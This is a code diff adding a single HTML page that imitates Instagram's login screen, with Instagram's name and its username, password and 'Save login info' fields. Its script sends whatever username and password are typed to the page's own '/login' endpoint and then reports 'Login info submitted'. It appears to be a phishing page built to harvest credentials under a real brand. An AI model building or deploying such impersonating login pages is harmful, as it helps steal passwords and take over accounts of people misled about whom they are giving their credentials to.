@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            text-align: center;
+            width: 300px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0099ff;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+        .login-container .forgot-password {
+            color: lightgray;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="password" id="password" placeholder="Password">
+        <label>
+            <input type="checkbox" id="saveLoginInfo"> Save login info
+        </label>
+        <button onclick="submitForm()">Log in</button>
+        <div class="forgot-password">Forgot password?</div>
+    </div>
+
+    <script>
+        function submitForm() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const saveLoginInfo = document.getElementById('saveLoginInfo').checked;
+
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password, saveLoginInfo })
+            }).then(response => {
+                if (response.ok) {
+                    alert('Login info submitted');
+                } else {
+                    alert('Failed to submit login info');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
